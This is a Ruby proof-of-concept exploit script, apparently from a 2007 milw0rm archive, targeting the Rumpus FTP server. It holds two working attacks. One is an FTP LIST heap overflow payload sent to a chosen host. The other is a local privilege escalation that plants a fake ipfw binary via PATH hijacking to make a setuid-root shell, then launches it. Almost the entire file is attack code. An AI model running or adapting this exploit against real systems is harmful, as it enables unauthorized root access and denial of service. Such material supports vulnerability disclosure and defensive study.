#!/usr/bin/ruby
# Copyright (c) Lance M. Havok  <lmh [at] info-pull.com>
#               Kevin Finisterre <kf_lists [at] digitalmunition.com>
#
# Proof of concept for issues described in MOAB-18-01-2007.

require 'net/ftp'
require 'socket'

bugselected = (ARGV[0] || 0).to_i
target_host = (ARGV[1] || "localhost")
target_user = (ARGV[2] || "anonymous")
target_pass = (ARGV[3] || "rumproast")

def list_bug(o)
  payload =   "A" * 251
  payload <<  [0x41424344].pack("V")
  payload <<  [0x61626364].pack("V")
  payload <<  [0x30313233].pack("V")
  payload <<  [0xdeadface].pack("V")
  o.list(payload)
end

def local_priv_escalation()
  wrapper   = 'int main() { setuid(0); setgid(0); system("/bin/sh -i"); return 0; }'
  fake_ipfw = 'int main() { system("/usr/sbin/chown root: /tmp/shX; /bin/chmod 4755 /tmp/shX"); return 0; }'
  command_line =  "echo '#{wrapper}' > /tmp/test.c && cc -o /tmp/shX /tmp/test.c && "    +
                  "echo '#{fake_ipfw}' > /tmp/ipfw.c && cc -o /tmp/ipfw /tmp/ipfw.c && " +
                  'export PATH="/tmp/:$PATH" && /usr/local/Rumpus/rumpusd'
  system command_line
  sleep 1
  puts "++ Enjoy root shell..."
  system "/tmp/shX"
end

case bugselected
  when 0
    puts "++ FTP LIST heap buffer overflow..."
    Net::FTP.open(target_host) do |ftp|
      ftp.login("#{target_user}","#{target_pass}")
      list_bug(ftp)
    end
  when 1
    puts "++ Local privilege escalation..."
    local_priv_escalation()
end

# milw0rm.com [2007-01-19]